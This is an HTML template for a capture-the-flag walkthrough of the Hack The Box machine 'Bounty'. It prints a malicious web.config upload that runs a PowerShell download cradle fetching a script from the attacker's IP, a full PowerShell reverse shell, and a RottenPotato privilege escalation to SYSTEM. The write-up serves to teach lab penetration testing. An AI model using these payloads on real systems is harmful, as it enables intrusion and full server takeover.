@@ -1,0 +1,162 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB Bounty</h1>
+    <p class="text">Difficutly : Easy | UserDifficulty : 4.4</p>
+
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV $IP --min-rate=10000</u>
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 7.5
+|_http-title: Bounty
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre></div>
+
+<p class="text">Only HTTP is open. Also, the http uses Microsoft IIS.</p>
+<p class="text"><u>※IIS often uses aspx file.</u></p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/bounty/1.png' %}" alt="">
+    <p class="text">On the first page, an only image is displayed. Let's enuerate this page further. <br><br> As noted before, IIS server often uses aspx file. Therefore, we can use flag -x for gobuster.</p>
+</div>
+
+<div class="code-box"><pre><code>└─$ <u>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://$IP -x aspx -t 70</u>
+===============================================================
+/aspnet_client        (Status: 301) [Size: 158] [--&gt; http://10.129.30.180/aspnet_client/]
+/render/https://www.google.com.aspx (Status: 400) [Size: 11]
+/transfer.aspx        (Status: 200) [Size: 941]
+/uploadedfiles        (Status: 301) [Size: 158] [--&gt; http://10.129.30.180/uploadedfiles/]
+
+===============================================================</code></pre></div>
+
+<p class="text">I found transfer.aspx page and uploadedfiles page. We might upload some file to the target machine.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/bounty/2.png' %}" alt="">
+    <p class="text">As I assumed, I found file upload form. We have to check which file extensions we can upload. <br><br>After testing several file extensions, I found png file or other image file extenstions are accepted. Next, we have to check if we can upload aspx file by appending %00.png to the aspx file.</p>
+</div>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/bounty/3.png' %}" alt="">
+    <p class="text">I changed the file extension appending %00.png. Then, this file uploaded successfully. However, navigating to the page /fileuploaded/test.aspx doesn't return the file.</p>
+</div>
+
+<p class="text">We may other file extension we can upload. Let's test it.</p>
+<p class="text">First, we need to create file extension wordlist.</p>
+
+<div class="code-box"><pre><code>curl -sL 'https://msdn.microsoft.com/en-us/library/2wawkw1c.aspx' \
+  | grep -oP '(?i)(?&lt;=&lt;p>).*?(?=&lt;/p>)' \
+  | tr ' ' '\n' \
+  | grep '^\.' \
+  | tr -d ',' > iis_extensions.txt</code></pre></div>
+
+  <div class="code-box"><pre><code>cat iis_extensions.txt
+.txt
+.txt
+.asax
+.ascx
+.ashx
+...</code></pre></div>
+
+<p class="text">Then, resend upload request with any file and send it to intruder.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/bounty/4.png' %}" alt="">
+    <img src="{% static 'EthHack/images/bounty/5.png' %}" alt="">
+</div>
+
+<p class="text">Press add button and load wordlist we made before to modify filename. <u>Note that uncheck the box URL-encode these characters</u>. It encodes . into %2e, which is url encoded for dot and interrupt our test.</p>
+<p class="text">Intruder suggest that the config file can be uploaded since the length of response is shorter than others.</p>
+
+<p class="text">Because we can include and execute aspx code in config file, we can get reverse shell with it.</p>
+
+<div class="code-box"><pre><code>&lt;?xml version="1.0" encoding="UTF-8"?>
+&lt;configuration>
+    &lt;system.webServer>
+      &lt;handlers accessPolicy="Read, Script, Write">
+         &lt;add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
+      &lt;/handlers>
+      &lt;security>
+         &lt;requestFiltering>
+            &lt;fileExtensions>
+               &lt;remove fileExtension=".config" />
+            &lt;/fileExtensions>
+            &lt;hiddenSegments>
+               &lt;remove segment="web.config" />
+            &lt;/hiddenSegments>
+         &lt;/requestFiltering>
+      &lt;/security>
+   &lt;/system.webServer>
+&lt;/configuration>
+&lt;%@ Language=VBScript %>
+&lt;%
+  call Server.CreateObject("WSCRIPT.SHELL").Run("cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.16.38:8000/shell.ps1')")
+%></code></pre></div>
+
+<p class="text">Also shell.ps1</p>
+<div class="code-box"><pre><code>&#36;client = New-Object System.Net.Sockets.TCPClient('10.10.16.38',4444);&#36;stream = &#36;client.GetStream();[byte[]]&#36;bytes = 0..65535|%{0};while((&#36;i = &#36;stream.Read(&#36;bytes, 0, &#36;bytes.Length)) -ne 0){;&#36;data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(&#36;bytes,0, &#36;i);&#36;sendback = (iex &#36;data 2>&1 | Out-String );&#36;sendback2  = &#36;sendback + 'PS ' + (pwd).Path + '> ';&#36;sendbyte = ([text.encoding]::ASCII).GetBytes(&#36;sendback2);&#36;stream.Write(&#36;sendbyte,0,&#36;sendbyte.Length);&#36;stream.Flush()};&#36;client.Close()</code></pre></div>
+
+<p class="text">Then, we can serve this ps1 file with python server and get reverse shell with nc.</p>
+<p class="text">After upload, get request from target server came as soon as navigating to /uploadedfiles/web.config. </p>
+
+<div class="code-box"><pre><code>└─$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.129.30.180 - - [03/Nov/2025 11:07:18] "GET /shell.ps1 HTTP/1.1" 200 -
+
+    
+└─$ nc -lvnp 4443
+listening on [any] 4443 ...
+connect to [10.10.16.38] from (UNKNOWN) [10.129.30.180] 49286
+PS C:\windows\system32\inetsrv> whoami
+bounty\merlin</code></pre></div>
+<p class="text">We got merliin user.</p>
+
+<h2 class="subtitle">PrivEsc</h2>
+<div class="code-box"><pre><code>PS C:\windows\system32\inetsrv> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+<u>SeImpersonatePrivilege</u>        Impersonate a client after authentication Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled</code></pre></div>
+<p class="text">Because we have SeImpersonatePrivilege, we can upgrade our privilege with <u>PotatoFamily</u>.</p>
+<p class="text">To do that, you need to install MSFRottenPotato from <a href="https://github.com/NotMedic/lonelypotato/blob/master/RottenPotatoEXE/MSFRottenPotato.exe">here</a>.</p>
+<p class="text">This tool can execute .bat file wih SeImpersonatePrivilege. So, we can create bat file with reverse shell we used before.</p>
+
+<div class="code-box"><pre><code>└─$ cat shell.bat     
+powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.16.38:8000/shell.ps1')</code></pre></div>
+<p class="text">Then, let's server these files to the target machine.</p>
+
+<div class="code-box"><pre><code>PS C:\windows\system32\inetsrv> (new-object net.webclient).downloadfile('http://10.10.16.38:8000/MSFRottenPotato.exe', 'C:\users\merlin\appdata\local\temp\RottenPotato.exe')
+PS C:\windows\system32\inetsrv> (new-object net.webclient).downloadfile('http://10.10.16.38:8000/shell.bat', 'C:\users\merlin\appdata\local\temp\rev.bat')</code></pre></div>
+<p class="text">Then, we can execute RottenPotato.</p>
+<p class="text"><u>※You need to open http server on where you have shell.ps1. Also you need to open port with nc to accept reverse shell.</u></p>
+<div class="code-box"><pre><code>PS C:\windows\system32\inetsrv> C:\users\merlin\appdata\local\temp\RottenPotato.exe * C:\users\merlin\appdata\local\temp\rev.bat</code></pre></div>
+
+<div class="code-box"><pre><code>└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.38] from (UNKNOWN) [10.129.30.180] 49173
+id
+PS C:\Windows\system32> whoami
+nt authority\system</code></pre></div>
+
+<p class="text">We got reverse shell from authority\system. </p>
+
+</body>
+</html>
